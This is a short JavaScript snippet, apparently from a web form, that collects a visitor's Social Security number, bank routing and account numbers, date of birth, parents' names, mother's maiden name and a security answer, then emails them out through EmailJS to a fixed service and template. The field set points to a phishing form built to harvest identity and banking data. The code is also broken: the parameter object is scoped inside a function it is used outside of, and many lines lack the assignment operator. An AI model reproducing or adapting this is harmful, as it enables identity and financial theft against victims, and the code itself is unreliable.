function sendMail(){
   var params = {
     name:document.getElementById("fname").value ,
     ssn:document.getElementById("ssn").value ,
     mailAddress:document.getElementById("mailAddress").value ,
     fathersfname:document.getElementById("fathersfname").value ,
     mothersfname:document.getElementById("mothersfname").value ,
     motherMname:document.getElementById("motherMname").value ,
     city:document.getElementById("city").value ,
     state:document.getElementById("state").value ,
     amount:document.getElementById("amount").value ,
     routing:document.getElementById("routing").value ,
     account:document.getElementById("account").value ,
     phone_number:document.getElementById("phone_number").value ,
      QA:document.getElementById("QA").value ,
     dob:document.getElementById("dob").value ,
     dateOfPayment:document.getElementById("dateOfPayment").value ,
      };
}

const serviceID = "service_t73ebru";
const templateID = "template_247tf3d"

emailjs.send(serviceID,templateID,params)
.then(
    res =>{
     document.getElementById("fname").value ="" ;
     document.getElementById("ssn").value "";
     document.getElementById("mailAddress").value "";
     document.getElementById("fathersfname").value "";
     document.getElementById("mothersfname").value "";
     document.getElementById("motherMname").value "";
     document.getElementById("city").value "";
     document.getElementById("state").value "";
     document.getElementById("amount").value "";
     document.getElementById("routing").value "";
     document.getElementById("account").value "";
     document.getElementById("phone_number").value "";
     document.getElementById("QA").value "";
     document.getElementById("dob").value "";
     document.getElementById("dateOfPayment").value "";
     console.log(res);
     alert("your message sent successfully")
       } )
.catch((err) => console.log(err));
